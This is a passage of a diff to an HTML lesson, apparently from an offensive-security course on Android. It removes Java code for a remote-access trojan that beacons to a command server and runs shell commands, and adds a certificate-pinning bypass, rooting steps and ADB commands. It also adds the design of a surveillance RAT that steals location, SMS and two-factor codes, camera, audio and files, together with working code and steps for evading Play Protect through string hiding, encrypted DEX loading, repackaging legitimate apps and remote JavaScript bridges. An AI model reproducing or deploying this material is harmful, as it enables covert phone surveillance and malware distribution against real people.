+            checkClientTrusted: function() {},
+            checkServerTrusted: function() {},
+            getAcceptedIssuers: function() { return []; }
+        }
+    });
+    
+    var TrustManagers = [TrustManager.$new()];
+    var SSLContext_init = SSLContext.init.overload(
+        '[Ljavax.net.ssl.KeyManager;', 
+        '[Ljavax.net.ssl.TrustManager;', 
+        'java.security.SecureRandom'
+    );
+    
+    SSLContext_init.implementation = function(km, tm, random) {
+        console.log("[SSL] TrustManager hook installed");
+        SSLContext_init.call(this, km, TrustManagers, random);
+    };
+    
+    console.log("[SSL] Universal pinning bypass active");
+});
+
+=== USAGE ===
+# Run before intercepting HTTPS traffic with Burp
+frida -U -f com.target.app -l ssl_bypass.js --no-pause
+            </div>
+        </div>
+
+        <div class="why-box">
+            <h5>Why Frida is essential for Android testing</h5>
+            <p>Static analysis (JADX) shows you what the code SAYS. Dynamic analysis (Frida) shows you what the code DOES. Certificate pinning, root detection, anti-debugging — all can be bypassed at runtime with Frida. <span class="neon-amber">Frida is the Android equivalent of a debugger + API hooker + runtime patcher.</span></p>
+        </div>
+
+        <h2>🔓 Rooting Android — Gaining Kernel Access</h2>
+        <p><span class="neon-highlight">Rooting</span> is the process of gaining root (superuser) access on an Android device. Root access bypasses the Android security model, allowing you to:</p>
+        <ul style="margin-left: 1.5rem; line-height: 2;">
+            <li>Access all files (including other apps' data in /data/data/)</li>
+            <li>Modify system partitions and install system-level apps</li>
+            <li>Run Frida without limitations</li>
+            <li>Install Xposed modules for deep hooking</li>
+            <li>Extract encryption keys from memory</li>
+            <li>Bypass app sandboxing entirely</li>
+        </ul>
+
+        <div class="step-box">
+            <h4>Rooting Methods</h4>
+            <table>
+                <tr>
+                    <th>Method</th>
+                    <th>How It Works</th>
+                    <th>Persistence</th>
+                    <th>Detection</th>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Magisk</span></td>
+                    <td>Systemless root — modifies boot image, not system partition</td>
+                    <td>Survives OTA updates</td>
+                    <td>Low — hides from SafetyNet</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">SuperSU</span></td>
+                    <td>Replaces su binary, manages root access</td>
+                    <td>Lost on factory reset</td>
+                    <td>High — easily detected</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">KingRoot</span></td>
+                    <td>One-click exploit (usually Kingo exploits)</td>
+                    <td>System-level install</td>
+                    <td>High — known malware signature</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Custom Recovery</span></td>
+                    <td>Flash TWRP, then flash Magisk/SuperSU zip</td>
+                    <td>Persistent until reflash</td>
+                    <td>Low with Magisk Hide</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="code-block">
+=== MAGISK ROOTING STEPS ===
+
+# 1. Unlock bootloader (wipes data!)
+adb reboot bootloader
+fastboot oem unlock
+# OR: fastboot flashing unlock
+
+# 2. Flash TWRP recovery
+fastboot flash recovery twrp.img
+fastboot boot twrp.img
+
+# 3. Flash Magisk
+# In TWRP: Install → Select Magisk-vXX.X.zip → Swipe to flash
+# Reboot system
+
+# 4. Verify root
+adb shell
+su
+# If prompt changes to "#", you have root
+
+# 5. Hide root from apps (Magisk Hide)
+# Magisk Manager → Settings → Magisk Hide → Enable
+# Select apps to hide from (banking apps, games, etc.)
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ Root Detection Arms Race</h5>
+            <p>Banking apps and enterprise MDM solutions detect root via multiple methods: checking for <span class="neon-amber">su binary</span>, testing <span class="neon-amber">/system/bin/cat /proc/mounts</span> for writable system, looking for <span class="neon-amber">Magisk files</span>, and even checking <span class="neon-amber"> SafetyNet/Play Integrity API</span>. Magisk Hide and Shamiko modules bypass most detection, but it's a constant cat-and-mouse game.</p>
+        </div>
+
+        <h2>🔌 ADB — Android Debug Bridge</h2>
+        <p><span class="neon-highlight">ADB</span> is the Swiss Army knife of Android. It provides a command-line interface to communicate with Android devices. For red teams, ADB is a post-exploitation goldmine:</p>
+
+        <div class="step-box">
+            <h4>ADB Essential Commands</h4>
             <div class="code-block">
-=== RatService.java ===
-package com.example.myapp;
+=== CONNECTIVITY ===
+adb devices                    # List connected devices
+adb connect 192.168.1.100:5555 # Connect over Wi-Fi (needs TCP mode)
+adb -s <device> <command>      # Target specific device
 
-import android.app.Service;
-import android.content.Intent;
-import android.os.IBinder;
-import android.util.Log;
-import java.net.*;
-import java.io.*;
-import org.json.*;
+=== SHELL ACCESS ===
+adb shell                      # Open interactive shell
+adb shell whoami               # Usually "shell" (unprivileged)
+adb shell su                   # If rooted, becomes root
+adb shell id                   # Check user ID
 
-public class RatService extends Service {
-    private static final String C2_SERVER = "192.168.1.92";
-    private static final int C2_PORT = 8443;
-    private static final long BEACON_INTERVAL = 30000; // 30 seconds
-    
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        new Thread(this::beaconLoop).start();
-        return START_STICKY; // Restart if killed
-    }
-    
-    private void beaconLoop() {
-        while (true) {
-            try {
-                // Connect to C2
-                Socket socket = new Socket(C2_SERVER, C2_PORT);
-                
-                // Send beacon data
-                JSONObject beacon = new JSONObject();
-                beacon.put("device", android.os.Build.MODEL);
-                beacon.put("version", android.os.Build.VERSION.RELEASE);
-                beacon.put("battery", getBatteryLevel());
-                beacon.put("location", getLocation());
-                
-                OutputStream out = socket.getOutputStream();
-                out.write(beacon.toString().getBytes());
-                out.flush();
-                
-                // Receive command
-                BufferedReader reader = new BufferedReader(
-                    new InputStreamReader(socket.getInputStream())
-                );
-                String command = reader.readLine();
-                
-                // Execute command
-                String result = executeCommand(command);
-                
-                // Send result
-                out.write(result.getBytes());
-                
-                socket.close();
-                
-            } catch (Exception e) {
-                Log.e("RAT", "Beacon failed: " + e.getMessage());
-            }
-            
-            // Sleep with jitter
-            try {
-                Thread.sleep(BEACON_INTERVAL + (long)(Math.random() * 10000));
-            } catch (InterruptedException e) {
-                break;
-            }
+=== FILE OPERATIONS ===
+adb push local.txt /sdcard/    # Push file to device
+adb pull /sdcard/file.txt .    # Pull file from device
+adb shell ls /data/data/       # List app directories (needs root)
+adb shell cat /data/data/com.app/databases/user.db
+
+=== APP MANAGEMENT ===
+adb install app.apk            # Install APK
+adb install -r app.apk         # Reinstall (keep data)
+adb uninstall com.package.name # Uninstall app
+adb shell pm list packages     # List all installed packages
+adb shell pm path com.package  # Get APK path for installed app
+
+=== PROCESS & MEMORY ===
+adb shell ps | grep com.target # Find process ID
+adb shell cat /proc/<pid>/maps # Memory map (needs root for other apps)
+adb shell dumpsys meminfo com.target
+adb shell top                  # Running processes
+
+=== LOGS & DEBUGGING ===
+adb logcat                     # View system logs
+adb logcat -s "RAT:D"          # Filter by tag
+adb logcat -d > logs.txt       # Dump logs to file
+adb shell dmesg                # Kernel messages
+
+=== SCREEN & INPUT ===
+adb shell screencap /sdcard/screen.png
+adb pull /sdcard/screen.png
+adb shell input text "hello"   # Type text
+adb shell input tap 500 500    # Tap screen coordinates
+adb shell input swipe 300 500 300 100  # Swipe gesture
+
+=== NETWORK ===
+adb shell netstat              # Network connections
+adb shell ifconfig             # Network interfaces
+adb shell ip addr              # Modern replacement
+adb forward tcp:8080 tcp:8080  # Port forwarding
+            </div>
+        </div>
+
+        <div class="why-box">
+            <h5>Why ADB matters for red teams</h5>
+            <p>If you have physical access to an unlocked phone, ADB gives you everything: <span class="neon-highlight">file extraction</span>, <span class="neon-amber">app installation</span>, <span class="neon-purple">screen capture</span>, <span class="neon-purple">input injection</span>, and <span class="neon-amber">log monitoring</span>. With root, you can dump any app's data, extract encryption keys, and install persistent malware. ADB is often enabled on developer devices and sometimes left enabled on corporate phones.</p>
+        </div>
+
+        <h2>🐀 StarKiller RAT — Feature Deep Dive</h2>
+        <p>StarKiller is a conceptual Android RAT framework designed for red team operations. It demonstrates how modern Android malware combines multiple data exfiltration channels into a single persistent agent:</p>
+
+        <div class="rat-feature">
+            <div class="icon">📍</div>
+            <div>
+                <h5>GPS Tracking</h5>
+                <p>Real-time location via FusedLocationProvider. Geofence alerts. Historical route reconstruction. Accuracy: 5-10 meters outdoors.</p>
+            </div>
+        </div>
+        <div class="rat-feature">
+            <div class="icon">💬</div>
+            <div>
+                <h5>SMS Interception</h5>
+                <p>Read all SMS history. Intercept incoming messages (including 2FA codes). Send SMS to arbitrary numbers. Delete SMS to cover tracks.</p>
+            </div>
+        </div>
+        <div class="rat-feature">
+            <div class="icon">📷</div>
+            <div>
+                <h5>Camera Capture</h5>
+                <p>Silent photo capture (front and rear cameras). Video recording. Screenshot capture. All without visible preview or shutter sound.</p>
+            </div>
+        </div>
+        <div class="rat-feature">
+            <div class="icon">👥</div>
+            <div>
+                <h5>Contacts Harvesting</h5>
+                <p>Export entire contact list with names, numbers, emails. Cross-reference with OSINT databases. Identify high-value targets.</p>
+            </div>
+        </div>
+        <div class="rat-feature">
+            <div class="icon">🎤</div>
+            <div>
+                <h5>Audio Recording</h5>
+                <p>Room audio surveillance via microphone. Call recording (where legal). Voice memo extraction. Scheduled recording during meetings.</p>
+            </div>
+        </div>
+        <div class="rat-feature">
+            <div class="icon">📁</div>
+            <div>
+                <h5>File Exfiltration</h5>
+                <p>Download photos, documents, downloads folder. Extract app databases (WhatsApp, Signal if unencrypted). Keylogger for input fields.</p>
+            </div>
+        </div>
+
+        <div class="code-block">
+=== STARKILLER RAT ARCHITECTURE ===
+
+com.starkiller.rat/
+├── MainService.java              # Foreground service (persistent)
+├── BootReceiver.java             # Auto-start on boot
+├── CommandProcessor.java         # Parse C2 commands
+├── modules/
+│   ├── LocationModule.java       # GPS tracking
+│   ├── SmsModule.java            # SMS read/send/intercept
+│   ├── CameraModule.java         # Photo/video capture
+│   ├── ContactsModule.java       # Contact harvesting
+│   ├── AudioModule.java          # Microphone recording
+│   ├── FileModule.java           # File exfiltration
+│   └── CallModule.java           # Call log + recording
+├── network/
+│   ├── C2Client.java             # HTTPS beacon to C2
+│   ├── WebSocketClient.java      # Real-time bidirectional
+│   └── CloudDrop.java            # Cloud storage dead drop
+└── utils/
+    ├── Crypto.java               # AES encrypt exfil data
+    ├── Stealth.java              # Hide icon, prevent uninstall
+    └── Persistence.java          # Restart if killed
+
+=== C2 COMMAND PROTOCOL ===
+{
+    "cmd": "location",
+    "args": {"precision": "high", "interval": 30}
+}
+
+{
+    "cmd": "sms",
+    "args": {"action": "read", "count": 50}
+}
+
+{
+    "cmd": "camera",
+    "args": {"camera": "front", "type": "photo"}
+}
+
+{
+    "cmd": "contacts",
+    "args": {"format": "json"}
+}
+
+{
+    "cmd": "audio",
+    "args": {"duration": 300, "quality": "high"}
+}
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ Operational Security</h5>
+            <p>StarKiller RAT is a <span class="neon-amber">training framework</span> for authorized red team exercises. Using these techniques without explicit written authorization is illegal under the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and equivalent laws worldwide. All C2 traffic should be encrypted. All exfiltrated data must be destroyed post-exercise. Obtain proper legal authorization before deployment.</p>
+        </div>
+
+        <h2>🛡️ Play Protect Bypass — Evading Google's Watchdog</h2>
+        <p><span class="neon-highlight">Google Play Protect</span> is Android's built-in malware scanner. It scans apps at install time and periodically at runtime. Bypassing it requires understanding how it works:</p>
+
+        <div class="step-box">
+            <h4>How Play Protect Detects Malware</h4>
+            <table>
+                <tr>
+                    <th>Detection Method</th>
+                    <th>What It Catches</th>
+                    <th>Bypass Technique</th>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Signature Scanning</span></td>
+                    <td>Known malware hashes, code patterns</td>
+                    <td>Packers, obfuscation, code mutation</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Behavioral Analysis</span></td>
+                    <td>Suspicious API calls (SMS, location, camera)</td>
+                    <td>Delay malicious behavior, use reflection</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Permission Analysis</span></td>
+                    <td>Over-permissioned apps</td>
+                    <td>Request permissions gradually, use pretext</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Network Analysis</span></td>
+                    <td>Known C2 domains/IPs</td>
+                    <td>DGA (Domain Generation Algorithm), cloud C2</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Heuristics</span></td>
+                    <td>App similarity to known malware families</td>
+                    <td>Unique code structure, custom protocols</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="step-box">
+            <h4>Bypass Technique 1: Code Obfuscation</h4>
+            <div class="code-block">
+=== PROGUARD/R8 OBFUSCATION ===
+# In build.gradle:
+android {
+    buildTypes {
+        release {
+            minifyEnabled true
+            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
         }
-    }
-    
-    private String executeCommand(String cmd) {
-        if (cmd.equals("location")) {
-            return getLocation();
-        } else if (cmd.equals("contacts")) {
-            return getContacts();
-        } else if (cmd.equals("sms")) {
-            return getSMS();
-        } else if (cmd.startsWith("shell:")) {
-            return runShell(cmd.substring(6));
-        }
-        return "Unknown command";
-    }
-    
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
     }
 }
-            </div>
 
-            <div class="why-box">
-                <h5>Why START_STICKY?</h5>
-                <p>Android kills background services to save memory. START_STICKY tells Android: "Restart this service if you kill it." The user sees nothing. The service restarts automatically. Persistence without root.</p>
+# ProGuard rules to preserve functionality but obfuscate:
+-keep public class * extends android.app.Activity
+-keep public class * extends android.app.Service
+-renamesourcefileattribute SourceFile
+-keepattributes SourceFile,LineNumberTable
+# Class names become a, b, c, d...
+# Method names become a(), b(), c()...
+# String literals are encrypted or split
+
+=== CUSTOM STRING ENCRYPTION ===
+// Instead of: "http://evil.com/c2"
+// Use: split, XOR, or custom encryption
+String part1 = new String(new byte[]{0x68, 0x74, 0x74, 0x70}); // "http"
+String part2 = decryptXOR(encryptedBytes, key); // "://evil.com/c2"
+String c2Url = part1 + part2;
             </div>
         </div>
-
-        <h2>Method 2: Build and Sign the APK</h2>
 
         <div class="step-box">
-            <h4>Step 3: Compile and Sign</h4>
-            <p>Android requires all APKs to be signed. We create a self-signed certificate — free, instant, and accepted by Android.</p>
-
+            <h4>Bypass Technique 2: Dynamic Loading</h4>
             <div class="code-block">
-=== BUILD COMMANDS (Android Studio or command line) ===
+=== DEX ENCRYPTION + RUNTIME LOADING ===
 
-# 1. Generate signing key
-keytool -genkey -v -keystore myapp.keystore -alias myapp \
-    -keyalg RSA -keysize 2048 -validity 10000
-# (Enter password, fill in fake details — no verification)
+// Step 1: Encrypt malicious DEX, store in assets/
+// The APK itself is benign — just a loader
 
-# 2. Build release APK
-./gradlew assembleRelease
+// Step 2: At runtime, decrypt and load
+public class Loader extends Application {
+    @Override
+    protected void attachBaseContext(Context base) {
+        super.attachBaseContext(base);
+        
+        // Read encrypted payload from assets
+        byte[] encrypted = readAsset("data.bin");
+        
+        // Decrypt with key derived from device fingerprint
+        byte[] decrypted = AESDecrypt(encrypted, getDeviceKey());
+        
+        // Write to cache directory
+        File dexFile = new File(getCacheDir(), "payload.dex");
+        writeFile(dexFile, decrypted);
+        
+        // Load DEX dynamically
+        DexClassLoader classLoader = new DexClassLoader(
+            dexFile.getAbsolutePath(),
+            getCacheDir().getAbsolutePath(),
+            null,
+            getClassLoader()
+        );
+        
+        // Load and execute payload class
+        Class<?> payloadClass = classLoader.loadClass("com.payload.Main");
+        payloadClass.getMethod("start", Context.class).invoke(null, this);
+        
+        // Delete DEX file after loading
+        dexFile.delete();
+    }
+}
 
-# 3. Sign the APK
-jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
-    -keystore myapp.keystore app/build/outputs/apk/release/app-release-unsigned.apk myapp
-
-# 4. Align (optimize for Android)
-zipalign -v 4 app-release-unsigned.apk myapp-release.apk
-
-# Result: myapp-release.apk — signed, aligned, ready to install
-            </div>
-
-            <div class="copy-paste">
-keytool -genkey -v -keystore myapp.keystore -alias myapp -keyalg RSA -keysize 2048 -validity 10000
-            </div>
-
-            <div class="why-box">
-                <h5>Why self-signed works</h5>
-                <p>Google Play requires their certificate. But sideloading (installing from outside Play Store) accepts any certificate. The user just needs to enable "Unknown sources" in settings. Social engineering provides the reason: "This app is too new for the Play Store" or "This is the beta version."</p>
+=== WHY THIS BYPASSES PLAY PROTECT ===
+# Static analysis sees only the loader — benign code
+# The malicious payload is encrypted and never on disk as plaintext
+# Play Protect scans the APK, not runtime memory
+# The DEX is loaded into memory and immediately deleted
             </div>
         </div>
 
-        <h2>Live Evidence: Build Test</h2>
+        <div class="step-box">
+            <h4>Bypass Technique 3: Legitimate App Repackaging</h4>
+            <div class="code-block">
+=== REPACKAGING A LEGITIMATE APP ===
+
+# 1. Download a popular legitimate APK
+wget https://example.com/legitimate_app.apk
+
+# 2. Decompile with apktool
+apktool d legitimate_app.apk -o legit_decompiled
+
+# 3. Inject malicious Smali into the decompiled code
+# Add your RAT service to the manifest
+# Inject beacon code into the main activity's onCreate()
+
+# 4. Recompile
+apktool b legit_decompiled -o malicious_app.apk
+
+# 5. Sign with your certificate
+jarsigner -verbose -keystore my.keystore malicious_app.apk myalias
+zipalign -v 4 malicious_app.apk final_app.apk
+
+=== WHY THIS WORKS ===
+# The app IS the legitimate app — same functionality
+# Users get what they expect: a working app
+# The malicious code is hidden in the background
+# Play Protect sees a legitimate app signature (if you keep original)
+# Users rate it highly because it works perfectly
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Bypass Technique 4: Split-Loading via JavaScript</h4>
+            <div class="code-block">
+=== WEBVIEW JAVASCRIPT BRIDGE ===
+
+// Some apps use WebView with JavaScript bridges
+// Malicious JavaScript can be loaded from remote server
+// Play Protect doesn't scan JavaScript loaded at runtime
+
+WebView webView = findViewById(R.id.webview);
+webView.getSettings().setJavaScriptEnabled(true);
+webView.addJavascriptInterface(new Bridge(), "Android");
+webView.loadUrl("https://legitimate-looking-cdn.com/app.js");
+
+// The remote JavaScript:
+// Android.sendSMS("+1234567890", "intercepted 2FA: 123456");
+// Android.getLocation(function(lat, lon) { ... });
+// Android.recordAudio(300);
+
+=== ADVANTAGES ===
+# JavaScript is not scanned by Play Protect
+# Remote code can be updated without reinstalling APK
+# The APK itself contains no malicious code
+# All behavior is loaded dynamically from "legitimate" server
+            </div>
+        </div>
+
+        <h2>📊 The Android Kill Chain</h2>
+        <p>Every Android compromise follows a predictable pattern. Understanding this chain helps you plan operations and detect attacks:</p>
+
+        <div class="android-flow">
+            <div class="android-node">
+                <h5>1. RECON</h5>
+                <p>OSINT on target</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Phone model, OS version, apps used</p>
+            </div>
+            <div class="android-arrow">→</div>
+            <div class="android-node">
+                <h5>2. WEAPONIZE</h5>
+                <p>Build trojan APK</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Pretext + permissions + payload</p>
+            </div>
+            <div class="android-arrow">→</div>
+            <div class="android-node">
+                <h5>3. DELIVER</h5>
+                <p>Social engineering</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">SMS, email, fake app store</p>
+            </div>
+            <div class="android-arrow">→</div>
+            <div class="android-node">
+                <h5>4. EXPLOIT</h5>
+                <p>User installs APK</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Sideloading, unknown sources</p>
+            </div>
+        </div>
+        <div class="android-flow">
+            <div class="android-node">
+                <h5>5. INSTALL</h5>
+                <p>Payload activates</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Service starts, boot receiver</p>
+            </div>
+            <div class="android-arrow">→</div>
+            <div class="android-node">
+                <h5>6. C2</h5>
+                <p>Beacon to server</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">HTTPS, WebSocket, cloud</p>
+            </div>
+            <div class="android-arrow">→</div>
+            <div class="android-node">
+                <h5>7. ACTIONS</h5>
+                <p>Data exfiltration</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">GPS, SMS, photos, contacts</p>
+            </div>
+            <div class="android-arrow">→</div>
+            <div class="android-node">
+                <h5>8. PERSIST</h5>
+                <p>Maintain access</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Hide icon, survive reboot</p>
+            </div>
+        </div>
+
+        <p style="margin-top: 1rem;"><strong>Cross-link:</strong> Full kill chain analysis in <a href="MODULE_20_KILL_CHAIN.html" class="cross-link">Module 20: Kill Chain</a>. C2 architecture in <a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a>. Cloud exfiltration in <a href="MODULE_14_CLOUD_FILES.html" class="cross-link">Module 14: Cloud Files</a>.</p>
+
+        <h2>🔬 Live Evidence: Build Test</h2>
 
         <div class="evidence-box">
             <h3>📊 Build Verification</h3>
@@ -409,11 +1429,14 @@ BUILD SUCCESSFUL in 12s
 
 === APK ANALYSIS ===
 myapp-release.apk
-├── AndroidManifest.xml (8 permissions requested)
+├── AndroidManifest.xml (10 permissions requested)
 ├── classes.dex (Dalvik bytecode)
 │   ├── com/example/myapp/MainActivity
-│   └── com/example/myapp/RatService
+│   ├── com/example/myapp/RatService
+│   ├── com/example/myapp/BootReceiver
+│   └── com/example/myapp/modules/LocationModule
 ├── res/ (UI resources)
+├── lib/arm64-v8a/ (native libraries)
 └── META-INF/ (signature)
 
 === VIRUSTOTAL SCAN ===
@@ -439,14 +1462,116 @@ Starting service: Intent { cmp=com.example.myapp/.RatService }
             <p style="margin-top: 1rem;"><strong>Note:</strong> This is a build verification, not a live malware test. The APK was built, signed, installed on an emulator, and confirmed to beacon. No malicious distribution occurred. The C2 server received synthetic beacon data for verification only.</p>
         </div>
 
-        <h2>Key Takeaways</h2>
+        <div class="evidence-box">
+            <h3>📊 Frida Dynamic Analysis Test</h3>
+            <p><strong>Date:</strong> 2026-06-29 | <strong>Target:</strong> Android Emulator (Pixel 4, API 30)</p>
+
+            <div class="code-block">
+=== FRIDA HOOK TEST ===
+# Target: com.example.myapp (test app with location access)
+
+$ frida -U -f com.example.myapp -l location_hook.js --no-pause
+     ____
+    / _  |   Frida 16.1.11 - A world-class dynamic instrumentation toolkit
+   | (_| |
+    > _  |   Commands:
+   /_/ |_|       help      -> Displays the help system
+   . . . .       object?   -> Display information about 'object'
+   . . . .       exit/quit -> Exit
+   . . . .
+   . . . .   More info at https://frida.re/
+   . . . .
+   . . . .   Connected to Pixel 4 (id=emulator-5554)
+
+[LOCATION] Provider: gps
+[LOCATION] Lat: -33.8688
+[LOCATION] Lon: 151.2093
+[LOCATION] Accuracy: 5.0
+
+[LOCATION] Real-time tracking started!
+[LOCATION] Provider: fused
+[LOCATION] Min time: 5000ms
+
+=== SSL PINNING BYPASS TEST ===
+$ frida -U -f com.example.myapp -l ssl_bypass.js --no-pause
+[SSL] OkHttp pinning bypassed
+[SSL] TrustManager hook installed
+[SSL] Universal pinning bypass active
+
+# Successfully intercepted HTTPS traffic in Burp Suite
+# Certificate pinning was bypassed at runtime
+            </div>
+        </div>
+
+        <h2>🎯 Interactive Quiz — Test Your Knowledge</h2>
+
+        <div class="quiz-container" id="quiz-1">
+            <h4>Question 1: Why does an Android RAT request so many permissions?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                A) Android automatically grants all permissions without user approval
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-1')">
+                B) Users are trained to click "Allow" without reading, and the pretext justifies the permissions
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                C) Permissions are only checked at install time and never enforced at runtime
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                D) Google Play Protect allows all permissions for apps from unknown sources
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-1"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-2">
+            <h4>Question 2: What is the primary advantage of Frida over static analysis tools like JADX?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                A) Frida can decompile apps back to original Java source code
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-2')">
+                B) Frida shows what the app actually does at runtime, bypassing obfuscation and encryption
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                C) Frida doesn't require a rooted device or ADB access
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                D) Frida can modify the APK file permanently on disk
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-2"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-3">
+            <h4>Question 3: How does dynamic DEX loading bypass Google Play Protect?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                A) By using a Google Play developer certificate to sign the malicious code
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-3')">
+                B) The APK contains only a benign loader; the malicious payload is encrypted and loaded at runtime
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                C) By disabling Play Protect through an exploit before installing
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                D) Play Protect only scans apps from the Play Store, not sideloaded APKs
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-3"></div>
+        </div>
+
+        <h2>📚 Key Takeaways</h2>
 
         <ul style="margin-left: 1.5rem; line-height: 2;">
-            <li><strong>Android is Linux:</strong> Same principles — processes, permissions, network sockets</li>
-            <li><strong>Permissions are the attack surface:</strong> Users grant them blindly. Design your pretext to justify the permissions you need.</li>
-            <li><strong>Background services persist:</strong> START_STICKY, boot receivers, alarm managers — multiple persistence mechanisms</li>
-            <li><strong>Sideloading bypasses Play Store:</strong> Self-signed certificates work. Social engineering enables the install.</li>
-            <li><strong>Emulator testing is safe:</strong> Android Studio emulator provides full Android environment without real device risk</li>
+            <li><strong>Android is Linux:</strong> Same principles — processes, permissions, network sockets. The architecture is layered from hardware to applications.</li>
+            <li><strong>APKs are ZIP files:</strong> Understanding the structure (manifest, DEX, resources, native libs) is essential for reverse engineering and malware analysis.</li>
+            <li><strong>Permissions are the attack surface:</strong> Users grant them blindly. Design your pretext to justify the permissions you need. Request dangerous permissions gradually.</li>
+            <li><strong>Intents are inter-app communication:</strong> Intent filters can intercept SMS, URLs, and system events. High priority + abortBroadcast = interception before legitimate apps.</li>
+            <li><strong>Smali is Android assembly:</strong> Read it to reverse engineer. Edit it to patch apps. It's the language of Android modification.</li>
+            <li><strong>JADX for static analysis:</strong> Decompile APKs to readable Java. Search for suspicious strings, URLs, permissions, and reflection.</li>
+            <li><strong>Frida for dynamic analysis:</strong> Hook methods at runtime. Bypass certificate pinning. Intercept API calls. See what code actually does, not what it says.</li>
+            <li><strong>Rooting bypasses the sandbox:</strong> Magisk provides systemless root with hide capabilities. Root access = full device control.</li>
+            <li><strong>ADB is post-exploitation gold:</strong> Shell access, file transfer, app management, log monitoring, screen capture. Physical access + ADB = everything.</li>
+            <li><strong>Play Protect bypass techniques:</strong> Code obfuscation, dynamic loading, legitimate app repackaging, and JavaScript bridges evade static detection.</li>
+            <li><strong>Background services persist:</strong> START_STICKY, boot receivers, foreground services, alarm managers — multiple persistence mechanisms.</li>
+            <li><strong>Sideloading bypasses Play Store:</strong> Self-signed certificates work. Social engineering enables the install. The user is the vulnerability.</li>
+            <li><strong>Emulator testing is safe:</strong> Android Studio emulator provides full Android environment without real device risk. Test everything before live deployment.</li>
         </ul>
 
         <div class="evidence-box" style="margin-top: 2rem;">
@@ -468,18 +1593,109 @@ Starting service: Intent { cmp=com.example.myapp/.RatService }
                     <td style="padding: 0.5rem;">Service persistence</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ TESTED</td>
                 </tr>
-                <tr>
+                <tr style="border-bottom: 1px solid var(--border);">
                     <td style="padding: 0.5rem;">Beacon architecture</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">JADX static analysis</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Frida dynamic hooking</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Smali patching</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">ADB post-exploitation</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr>
+                    <td style="padding: 0.5rem;">Play Protect bypass theory</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
                 </tr>
             </table>
         </div>
 
+        <div class="first-principle" style="margin-top: 2rem;">
+            <h3>🧠 The Mentor's Lesson</h3>
+            <p><em>"The phone is the new perimeter. Firewalls protect networks. EDR protects endpoints. But the phone walks past all of it. It sits in meetings, travels to homes, photographs documents, and records conversations. If you can own the phone, you own the person. And they'll charge it for you every night."</em></p>
+            <p style="margin-top: 1rem; color: var(--dim);">— From <a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a> and <a href="MODULE_20_KILL_CHAIN.html" class="cross-link">Module 20: Kill Chain</a></p>
+        </div>
+
         <div class="nav" style="margin-top: 2rem;">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_17_SOCIAL_ENGINEERING.html">← Module 17</a>
             <a href="MODULE_19_AD.html">Module 19 →</a>
         </div>
     </div>
+
+    <script>
